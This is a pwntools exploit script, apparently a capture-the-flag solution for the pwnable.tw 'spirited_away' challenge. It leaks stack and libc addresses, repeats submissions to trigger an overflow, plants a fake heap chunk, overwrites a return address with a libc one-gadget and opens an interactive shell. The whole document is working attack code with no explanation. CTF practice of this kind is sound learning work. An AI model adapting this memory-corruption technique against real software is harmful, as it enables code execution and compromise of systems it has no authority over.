from pwn import *
import sys

def init(name, age, reason, comment, flag):
	if flag == 1:
		print p.recvuntil("name: ")
		p.send(name)
	
	print p.recv()
	p.sendline(str(age))

	print p.recv()
	p.send(reason)

	if flag == 1:
		print p.recv()
		p.send(comment)
	print p.recvuntil("Name: ")
	p.send("y")


if len(sys.argv) == 1:
	p = process("./spirited_away", env={"LD_PRELOAD":"./libc_32.so.6"})
else:
	p = remote("chall.pwnable.tw", 10204)

init("1"*60,2,"r"*80,"3"*60,1)

p.recvuntil("r"*80)
leak1 = u32(p.recv(4))
leak2 = u32(p.recv(4))
leak3 = u32(p.recv(4))
leak4 = u32(p.recv(4))
leak5 = u32(p.recv(4))
log.info("leak1 : 0x%x" % leak1)
log.info("leak2 : 0x%x" % leak2)
log.info("leak3 : 0x%x" % leak3)
log.info("leak4 : 0x%x" % leak4)
log.info("leak5 : 0x%x" % leak5)

reason_addr = leak1-0x70
libc_base = leak3-0x1b0d60
log.info("reason addr : 0x%x" % reason_addr)
log.info("libc base : 0x%x" % libc_base)

for i in range(9):
	init("ang",91,"mo","di",1)

for i in range(90):			# to trigger overflow
        init("ang",91,"mo","di",0)

mo = p32(0) + p32(0x40)			# fake chunk
mo += "\x00" * (0x40 - 8)
mo += p32(0) + p32(0x40)

di = "d"*80				# overflow
di += "i"*4
di += p32(reason_addr+8)
init("ang",91, mo, di, 1)

one_shot = libc_base + 0x5f065

print p.recv()
payload = "a" * 76
payload += p32(one_shot)
p.send(payload)
print p.recv()
p.send("a")
print p.recv()
p.send("a")
print p.recv()
p.send("a")
print p.recv()
p.send("n")
p.interactive()

